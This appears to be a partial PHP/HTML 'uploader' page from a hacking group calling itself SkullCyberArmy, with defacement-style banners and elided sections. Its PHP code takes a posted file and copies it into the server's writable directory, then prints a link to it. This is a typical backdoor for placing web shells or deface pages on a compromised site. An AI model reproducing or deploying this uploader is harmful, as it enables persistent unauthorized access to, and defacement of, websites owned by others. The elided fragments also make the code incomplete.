...
<body background="https://i.gifer.com/7A9d.gif">

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<meta name="keywords" content=" | [ UPLOADER SkullCyberArmy V.1 ] |
<meta HTTP-EQUIV="Content-Type" content="text/html; charset=iso-8859-1" />
<meta name="description" content=" | [ UPLOADER SkullCyberArmy V.1 ] |"><script type="text/javascript">
//<![CDATA[
...
<title>[ | UPLOADER SkullCyberArmy V.1 | ]</title>
...
<meta name="description" content="[ UPLOADER SkullCyberArmy V.1 ]">
...
<center> 
<img src="https://i.ibb.co/gPmWMb3/20210720-063313.jpg" "width="height="> 
<h1><font color="red" size="8" face="Courier" new="">UPLOADER SkullCyberArmy V.1</font></h1><font color="red" size="4" face="Courier" new=""> 
<h2><font color="white" size="6" face="Courier" new="">ONE DAY WE NEVER COME BACK!!!</font></h1><font color="white" size="4" face="Courier" new=""> 
...
($tipe === "sql") or 
($tipe === "xml")){
	echo "<br><br><center><font color='red' face='' size='4' >Follow Github Kami:) >>> </font><a href=https://github.com/skullcyberarmy-art'><font color='white' face='Iceland' size='4' > Touched Me!!! </font></a></center>";
				exit;
}else{
	$upload = $server."/".$file;
if(isset($_POST["up"])){
	if(is_writable($server)){
		if(@copy($_FILES["index"]["tmp_name"], $upload)){
			...
			echo "<br><br><center><font color='red' face='' size='8' >SUCCESS UPLOAD : </font><a href='$web$file' target='_blank'><font color='white' size='4' ><u>$web$file</u></font></a></center>";
		}else{
			echo "<br><br><center><font color='white' face='' size='8'>GAGAL UPLOAD GAN!!!</font></center>";
			}
		}
	}
}
?>
 ...
 <h1><font color="red" size="8" face="Courier" new="">©All Rights Reserved SkullCyberArmy 2020-2021</font></h1><font color="white" size="4" face="Courier" new=""> 
